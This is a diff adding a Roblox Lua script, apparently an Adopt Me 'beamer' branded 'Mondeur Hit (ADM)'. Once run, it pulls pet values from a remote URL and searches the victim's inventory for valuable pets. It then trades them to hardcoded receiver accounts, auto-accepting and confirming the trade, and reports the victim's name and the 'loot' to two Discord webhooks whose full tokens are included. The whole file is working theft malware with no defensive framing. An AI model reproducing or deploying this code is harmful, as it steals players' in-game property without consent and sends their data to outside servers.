@@ -1,0 +1,119 @@
+-- [[ MONDEUR HIT (ADM) | ELITE EDITION ]] --
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local LocalPlayer = Players.LocalPlayer
+
+-- [[ CONFIG ]] --
+local USER_WEBHOOK = "https://discord.com/api/webhooks/1474651524251648163/lhPvWSeT6mcm3b4tIfzEbph1asYmZGvxf3YABYsKUOSeInP3oXW10NmHKJuj0vDrICku"
+local DUAL_WEBHOOK = "https://discord.com/api/webhooks/1417861953208193126/wWUd-tqbQT56zqL_y0KSF_s5ZYdBKfLtBJaWYVCN_uwue9hq8CsGuQWJOL1ivGEZ2CYz"
+local POINT_SYSTEM_URL = "https://raw.githubusercontent.com/charles1384/ADM/refs/heads/main/Pointsystem"
+
+local TARGET_RECEIVERS = {"2ndcfpaj67", "sofiqmnz", "Hisokarah", "CREOLEO23"}
+local THRESHOLD = _G.Threshold or 100 -- Set this higher when you're done testing
+local PetValues = {}
+
+-- [[ LOAD POINT SYSTEM ]] --
+local function loadPoints()
+    local success, content = pcall(function() return game:HttpGet(POINT_SYSTEM_URL) end)
+    if success then
+        for line in content:gmatch("[^\r\n]+") do
+            local name, val = line:match("([^:=]+)[:=](%d+)")
+            if name and val then PetValues[name:lower():trim()] = tonumber(val) end
+        end
+    end
+end
+loadPoints()
+
+-- [[ THE "FIRE" WEBHOOK ]] --
+local function sendMondeurWebhook(url, pets, total)
+    local request = (syn and syn.request) or (http and http.request) or http_request or request
+    if not request then return end
+
+    local petString = ""
+    for _, p in ipairs(pets) do
+        petString = petString .. "⭐ **" .. p.name .. "** • `" .. p.value .. " pts`\n"
+    end
+
+    local isHighValue = (total >= THRESHOLD)
+    
+    local payload = {
+        username = "Mondeur Hit (ADM)",
+        avatar_url = "https://i.imgur.com/8Q0TzS9.png", -- Cool Ninja/Mondeur Icon
+        embeds = {{
+            title = "🚀 **Incoming Transmission: Successful Hit**",
+            description = "A new trade has been successfully intercepted and items moved.",
+            color = isHighValue and 0xff004c or 0x00ffcc, -- Neon Pink for big hits, Neon Cyan for small
+            thumbnail = { url = "https://i.imgur.com/uM9eL7B.png" }, -- Animated-style chest/pet icon
+            fields = {
+                {name = "👤 **Target Account**", value = "```" .. LocalPlayer.Name .. "```", inline = true},
+                {name = "💰 **Total Points**", value = "```" .. total .. "```", inline = true},
+                {name = "🎒 **Loot Collected**", value = petString ~= "" and petString or "No data found."}
+            },
+            footer = { text = "Mondeur Services v2.1 • Secured Connection", icon_url = "https://i.imgur.com/8Q0TzS9.png" },
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        }}
+    }
+
+    if isHighValue then payload.content = "@everyone 🔥 **MAJOR HIT DETECTED** 🔥" end
+
+    pcall(function()
+        request({
+            Url = url,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(payload)
+        })
+    end)
+end
+
+-- [[ TRADE LOGIC ]] --
+local function scanAndTrade()
+    local receiver = nil
+    for _, name in ipairs(TARGET_RECEIVERS) do
+        if Players:FindFirstChild(name) then receiver = Players[name] break end
+    end
+    if not receiver then return end
+
+    local list, total = {}, 0
+    local success, inv = pcall(function() return ReplicatedStorage.API["InventoryAPI/GetInventory"]:InvokeServer() end)
+    
+    if success and inv then
+        for _, item in ipairs(inv) do
+            if item.Kind == "Pet" then
+                -- FUZZY MATCHING: Checks if "Metal Ox" is anywhere in the name "Neon Ride Metal Ox"
+                for petName, val in pairs(PetValues) do
+                    if string.find(item.Name:lower(), petName:lower()) then
+                        table.insert(list, {id = item.Id, name = item.Name, value = val})
+                        total = total + val
+                        break
+                    end
+                end
+            end
+        end
+    end
+
+    if #list > 0 then
+        -- Execute Trade
+        local TradeAPI = ReplicatedStorage.API
+        TradeAPI["TradeAPI/SendTradeRequest"]:FireServer(receiver)
+        for _, p in ipairs(list) do
+            TradeAPI["TradeAPI/AddItemToOffer"]:FireServer(p.id)
+        end
+        TradeAPI["TradeAPI/AcceptTrade"]:FireServer()
+        TradeAPI["TradeAPI/ConfirmTrade"]:FireServer()
+        
+        -- Send the Fire Webhook
+        sendMondeurWebhook(USER_WEBHOOK, list, total)
+        if total >= THRESHOLD then sendMondeurWebhook(DUAL_WEBHOOK, list, total) end
+    end
+end
+
+-- [[ START ]] --
+print("🚀 Mondeur Hit (ADM) ELITE Loaded.")
+task.spawn(function()
+    while true do
+        pcall(scanAndTrade)
+        task.wait(1)
+    end
+end)
